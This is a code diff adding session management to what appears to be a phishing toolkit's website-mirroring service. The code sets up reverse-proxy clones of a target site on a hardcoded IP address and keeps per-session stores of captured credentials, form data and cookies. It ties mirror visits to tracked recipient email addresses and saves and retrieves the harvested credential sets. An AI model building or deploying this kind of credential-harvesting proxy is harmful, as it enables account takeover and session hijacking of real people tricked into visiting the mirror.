@@ -1355,6 +1355,298 @@ class WebsiteMirroringService {
       this.handleProxyError(error, res, session);
     }
   }
+
+  /**
+   * Create a new website mirroring session for a campaign
+   * @param {number} campaignId - Campaign ID
+   * @param {string} targetUrl - URL to mirror
+   * @returns {Promise<Object>} Mirror session details
+   */
+  async createMirrorSession(campaignId, targetUrl) {
+    try {
+      // Generate unique session token (like iksduhfgh_7898dmndfikd)
+      const sessionToken = crypto.randomBytes(16).toString('hex');
+      
+      // Normalize target URL
+      const normalizedUrl = this.normalizeUrl(targetUrl);
+      
+      // Create session in database
+      const sessionId = await new Promise((resolve, reject) => {
+        db.run(
+          `INSERT INTO WebsiteMirroringSessions 
+           (campaign_id, target_url, session_token, status, proxy_port) 
+           VALUES (?, ?, ?, ?, ?)`,
+          [campaignId, normalizedUrl, sessionToken, 'active', 5000],
+          function(err) {
+            if (err) reject(err);
+            else resolve(this.lastID);
+          }
+        );
+      });
+
+      // Create proxy URL using path-based routing on port 5000
+      const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
+      
+      // Create cookie jar for this session
+      const cookieJar = new CookieJar();
+      this.cookieJars.set(sessionToken, cookieJar);
+      
+      // Initialize session storage for this session
+      this.sessionStorage.set(sessionToken, {});
+      
+      // Initialize captures for this session
+      this.captures.set(sessionToken, {
+        credentials: [],
+        formData: [],
+        cookies: []
+      });
+      
+      // Store session info
+      const sessionData = {
+        sessionId,
+        campaignId,
+        targetUrl: normalizedUrl,
+        sessionToken,
+        proxyUrl,
+        startTime: new Date()
+      };
+      
+      this.activeSessions.set(sessionToken, sessionData);
+      this.mirrorRoutes.set(`/${sessionToken}`, sessionData);
+
+      console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
+      
+      return {
+        sessionId,
+        sessionToken,
+        proxyUrl,
+        targetUrl: normalizedUrl,
+        proxyPort: 5000 // Always use port 5000
+      };
+    } catch (error) {
+      console.error('Error creating mirror session:', error);
+      throw error;
+    }
+  }
+
+  /**
+   * Track access to mirrored content
+   */
+  async trackAccess(sessionId, req) {
+    try {
+      const timestamp = new Date().toISOString();
+      const ip = req.ip || req.connection.remoteAddress;
+      const userAgent = req.get('User-Agent') || '';
+      const trackingParam = req.query._fstrike_track;
+
+      // Update last accessed time and increment counter
+      db.run(
+        `UPDATE WebsiteMirroringSessions 
+         SET last_accessed = ?, access_count = access_count + 1 
+         WHERE id = ?`,
+        [timestamp, sessionId]
+      );
+
+      // Log visit with tracking ID if present
+      if (trackingParam) {
+        console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
+        
+        // Check if this corresponds to a tracking pixel
+        db.get(
+          `SELECT user_email FROM tracking_pixels WHERE id = ?`,
+          [trackingParam],
+          (err, row) => {
+            if (!err && row) {
+              console.log(`Mirror access by user: ${row.user_email}`);
+              
+              // Create link_clicks table if it doesn't exist
+              db.run(`CREATE TABLE IF NOT EXISTS link_clicks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                landing_page_id INTEGER,
+                ip_address TEXT,
+                user_agent TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+              )`, function(createErr) {
+                if (createErr) {
+                  console.error('Error creating link_clicks table:', createErr);
+                  return;
+                }
+                
+                // Now insert the click data
+                db.run(
+                  `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
+                   VALUES (?, 0, ?, ?)`,
+                  [sessionId, ip, userAgent]
+                );
+              });
+            }
+          }
+        );
+      } else {
+        console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
+      }
+    } catch (error) {
+      console.error('Error tracking access:', error);
+    }
+  }
+
+  /**
+   * Stop a mirroring session
+   */
+  async stopMirrorSession(sessionId) {
+    try {
+      // Find session by ID
+      let sessionToken = null;
+      for (const [token, session] of this.activeSessions.entries()) {
+        if (session.sessionId === sessionId) {
+          sessionToken = token;
+          break;
+        }
+      }
+
+      if (sessionToken) {
+        // Get final state of captures
+        const captures = this.captures.get(sessionToken);
+        
+        // Store captures in database if there are any credentials
+        if (captures && captures.credentials.length > 0) {
+          db.run(
+            `UPDATE WebsiteMirroringSessions 
+             SET captured_data = ? 
+             WHERE id = ?`,
+            [JSON.stringify(captures), sessionId]
+          );
+          
+          console.log(`Stored ${captures.credentials.length} credential sets for session ${sessionId}`);
+        }
+        
+        // Clean up memory
+        this.activeSessions.delete(sessionToken);
+        this.mirrorRoutes.delete(`/${sessionToken}`);
+        this.cookieJars.delete(sessionToken);
+        this.sessionStorage.delete(sessionToken);
+        this.captures.delete(sessionToken);
+      }
+
+      // Update database
+      await new Promise((resolve, reject) => {
+        db.run(
+          `UPDATE WebsiteMirroringSessions 
+           SET status = 'inactive' 
+           WHERE id = ?`,
+          [sessionId],
+          (err) => {
+            if (err) reject(err);
+            else resolve();
+          }
+        );
+      });
+
+      console.log(`Mirror session ${sessionId} stopped`);
+    } catch (error) {
+      console.error('Error stopping mirror session:', error);
+      throw error;
+    }
+  }
+
+  /**
+   * Get mirroring session details
+   */
+  async getMirrorSession(campaignId) {
+    return new Promise((resolve, reject) => {
+      db.get(
+        `SELECT * FROM WebsiteMirroringSessions 
+         WHERE campaign_id = ? AND status = 'active' 
+         ORDER BY created_at DESC LIMIT 1`,
+        [campaignId],
+        (err, row) => {
+          if (err) reject(err);
+          else resolve(row);
+        }
+      );
+    });
+  }
+
+  /**
+   * Helper methods
+   */
+  normalizeUrl(url) {
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+      url = 'https://' + url;
+    }
+    return url.endsWith('/') ? url.slice(0, -1) : url;
+  }
+
+  /**
+   * Clean up inactive sessions
+   */
+  async cleanupSessions() {
+    try {
+      // Stop sessions that haven't been accessed in 24 hours
+      const cutoffTime = new Date(Date.now() - 24 * 60 * 60 * 1000);
+      
+      const inactiveSessions = await new Promise((resolve, reject) => {
+        db.all(
+          `SELECT id FROM WebsiteMirroringSessions 
+           WHERE status = 'active' 
+           AND (last_accessed IS NULL OR last_accessed < ?)`,
+          [cutoffTime.toISOString()],
+          (err, rows) => {
+            if (err) reject(err);
+            else resolve(rows);
+          }
+        );
+      });
+
+      for (const session of inactiveSessions) {
+        await this.stopMirrorSession(session.id);
+      }
+
+      console.log(`Cleaned up ${inactiveSessions.length} inactive mirroring sessions`);
+    } catch (error) {
+      console.error('Error cleaning up sessions:', error);
+    }
+  }
+  
+  /**
+   * Get captured credentials for a session
+   */
+  async getCapturedCredentials(sessionId) {
+    // Try to find the session token
+    let sessionToken = null;
+    for (const [token, session] of this.activeSessions.entries()) {
+      if (session.sessionId === sessionId) {
+        sessionToken = token;
+        break;
+      }
+    }
+    
+    // Get captures from memory if available
+    if (sessionToken && this.captures.has(sessionToken)) {
+      return this.captures.get(sessionToken);
+    }
+    
+    // Otherwise try to get from database
+    return new Promise((resolve, reject) => {
+      db.get(
+        `SELECT captured_data FROM WebsiteMirroringSessions WHERE id = ?`,
+        [sessionId],
+        (err, row) => {
+          if (err) reject(err);
+          else if (row && row.captured_data) {
+            try {
+              resolve(JSON.parse(row.captured_data));
+            } catch (e) {
+              resolve({ credentials: [], formData: [], cookies: [] });
+            }
+          } else {
+            resolve({ credentials: [], formData: [], cookies: [] });
+          }
+        }
+      );
+    });
+  }
 }
 
 module.exports = new WebsiteMirroringService();
